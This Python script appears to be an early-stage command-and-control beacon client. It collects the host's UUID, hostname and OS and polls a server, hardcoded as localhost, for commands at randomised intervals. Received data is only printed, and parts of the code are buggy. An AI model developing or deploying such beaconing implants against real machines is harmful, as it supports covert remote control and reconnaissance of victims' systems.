#!/usr/bin/env python3

import os.path
import socket
from datetime import datetime
import time
import random
import uuid
from platform import node
import requests

SERVER_IP = "localhost"
SERVER_PORT = 8000
BUFFER_SIZE = 2048
OS = os.popen("lsb_release -d | cut -d ':' -f2").read().strip()
UUID = uuid.uuid1()
HOSTNAME = node().strip()
MAX_FAILS = 10
failCount = 0

def connectToServer(ip, port):
    print("Connecting to server")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    return s

def sendData(socket, data):
    print("Sending Data")
    socket.sendall(data.encode())

def closeSocket(socket):
    print("Closing Socket")
    socket.close()

def beacon(ip, port, soc):
    fields = "UUID: " + str(UUID) + "\r\n"
    fields += "HOSTNAME: " + HOSTNAME + "\r\n"
    fields += "OS: " + OS + "\r\n"
    httpGet("client/" + str(UUID) + "/commands",fields,  soc)

def httpGet(uri, params, soc):
    data = "GET /" + uri + " HTTP/1.1\r\n"
    data += params
    print(data)
    try:
        sendData(soc, str(data))
        failCount = 0
    except:
        failCount += 1
        print("FAILS: " + str(failCount))
        return False

def httpPost():
    data = {'UUID':UUID,
            'OS':OS,
            'HOSTNAME':HOSTNAME}
    r = requests.post(url = str("http://" + SERVER_IP + ":" + str(SERVER_PORT)), params = data)


if __name__ == "__main__":
    print("Starting client")
    while failCount < MAX_FAILS:
        try:
            s = connectToServer(SERVER_IP, SERVER_PORT)
            s.settimeout(5)
            beacon(SERVER_IP, SERVER_PORT, s)
            failCount = 0
        except:
            failCount += 1
            print("FAILS: " + str(failCount))
        print("Recieving data")
        data = ""
        try:
            data = s.recv(BUFFER_SIZE).decode()
        except:
            pass
        if data:
            print(data)
        try:
            closeSocket(s)
        except:
            pass
        time.sleep(random.randint(1,10))
